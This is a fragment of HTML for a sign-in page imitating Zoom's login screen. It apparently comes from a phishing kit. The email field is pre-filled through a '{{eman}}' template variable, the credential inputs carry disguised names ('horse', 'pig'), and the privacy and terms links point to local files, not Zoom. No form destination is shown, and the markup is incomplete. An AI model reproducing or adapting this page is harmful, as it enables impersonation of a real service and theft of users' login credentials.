<body style="margin: 0; padding: 0; box-sizing: border-box; font-family: 'Almaden Sans', Helvetica, Arial;">

                <div id="app" class="login-page" style="display: flex; flex-direction: column; align-items: center;">

                        </a>

                            <button class="mgl-xs zm-button--link zm-button--small" style="margin-left: 4px;">Sign Up Free</button>

                            </a>
                        </div>

                        <div class="layout-main" style="flex: 1;">
                            <div class="layout-main-slot" style="padding: 24px;">
                                <h1 class="zm-signup-layout__title" style="font-size: 32px; text-align: center; margin: 0 0 32px; line-height: 48px;">Sign In</h1>
                                <div style="max-width: 100%; width: 346px; margin: 0 auto;">

                                        <div class="zm-form-item" style="margin-bottom: 24px;">
                                            <input aria-required="true" aria-label="Email Address" value="{{eman}}" id="email" class="zm-input__inner" style="width: 100%; height: 20px; padding: 12px; border: 1px solid #6e767f; border-radius: 8px;" maxLength="128" name="horse" required placeholder="Email Address" autocomplete="email">
                                        </div>
                                        <div class="zm-form-item" style="margin-bottom: 24px;">
                                            <input aria-required="true" aria-label="Password" id="password" class="zm-input__inner" style="width: 100%; height: 20px; padding: 12px; border: 1px solid #6e767f; border-radius: 8px;" maxLength="99" type="password" name="pig" required placeholder="Password" autocomplete="password">
                                        </div>
                                        <button id="js_btn_login" class="btn-block zm-button--primary zm-button--large" style="width: 100%; height: 46px; background-color: rgb(14,114,237); color: #fff; border: none; border-radius: 10px;">Sign In</button>
                                        <p id="agree-terms" class="agree-terms" style="font-size: 14px; color: rgb(116,116,135); margin: 16px 0 10px; line-height: 20px;">By signing in, I agree to the <a style="color: rgb(9,86,181);" href="file:///C:/privacy" target="_blank">Zoom's Privacy Statement</a> and <a style="color: rgb(9,86,181);" href="file:///C:/terms" target="_blank">Terms of Service</a>.</p>
                                    </form>

                                    <button class="zm-button--link zm-button--small" style="margin-bottom: 8px;">Forgot password?</button>
                                    <button class="zm-button--link zm-button--small">Help</button>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
